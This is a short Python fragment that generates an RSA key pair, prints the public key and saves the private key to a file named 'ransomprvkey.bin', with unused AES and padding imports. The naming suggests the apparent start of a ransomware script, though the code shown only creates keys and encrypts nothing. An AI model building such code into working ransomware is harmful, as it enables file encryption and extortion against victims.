#checking what files are there in the folder
import os
import re
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util.Padding import pad, unpad

key1 = RSA.generate(2048)
publickey= key1.publickey().export_key()
print(publickey)
file_out = open("ransomprvkey.bin", "wb")
file_out.write(key1.export_key())
file_out.close()
